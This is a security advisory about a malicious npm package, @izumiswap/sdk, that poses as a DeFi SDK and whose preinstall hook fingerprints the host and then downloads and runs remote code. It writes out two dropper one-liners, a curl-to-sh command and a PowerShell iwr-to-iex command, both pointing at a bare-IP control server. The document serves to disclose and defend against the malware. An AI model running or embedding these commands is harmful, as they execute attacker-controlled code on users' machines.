summary: @izumiswap/sdk preinstall fetches and executes remote code from bare-IP C2
details: On `npm install`, the package's preinstall hook executes scripts/postinstall.js, which decodes a charcode-obfuscated URL resolving to http://213.218.160.189:8080, sends a base64-encoded host fingerprint (platform, arch, hostname, username, node version, cwd) as a query parameter, downloads the response to <tmpdir>/.npm-cache/v-<ts>.js, and spawns it with node detached using the installer's environment. The preinstall has shell and PowerShell fallbacks against the same endpoint: `curl -fsSL http://213.218.160.189:8080/sh -o /tmp/.n && sh /tmp/.n` on Unix and `iwr -Uri http://213.218.160.189:8080/ps -UseBasicParsing | iex` on Windows. The URL is hidden as a String.fromCharCode array, variables are single-letter, errors are silently swallowed, and a forced process.exit(0) ensures install appears successful. Cover-story comments label the operation as 'postinstall verification' and 'Analytics endpoint'. The package presents itself as the iZiSwap DeFi SDK (homepage docs.izumi.finance, repo izumiFinance/izumi-iZiSwap-sdk) — a likely impersonation/typosquat targeting DeFi developers. Plain HTTP, bare IP, no integrity check, multi-OS dropper coverage — textbook install-time RCE.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
